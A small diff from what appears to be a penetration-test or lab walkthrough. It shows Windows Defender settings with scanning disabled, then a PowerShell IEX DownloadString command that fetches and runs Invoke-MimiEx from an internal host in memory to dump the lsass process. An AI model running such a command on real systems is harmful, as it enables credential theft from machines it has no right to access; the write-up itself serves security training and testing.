@@ -313,7 +313,7 @@ DisableRemovableDriveScanning                 : True
 DisableRestorePoint                           : True
 DisableScanningMappedNetworkDrivesForFullScan : True
 ...
-
+```
 Download fileless Invoke-MimiEx in order to dump lsass process of the target machine:
 ```
 PS C:\Users\Administrator\.jenkins\workspace\Project0> IEX (New-Object Net.webclient).DownloadString("http://172.16.100.162/Invoke-MimiEx.ps1")
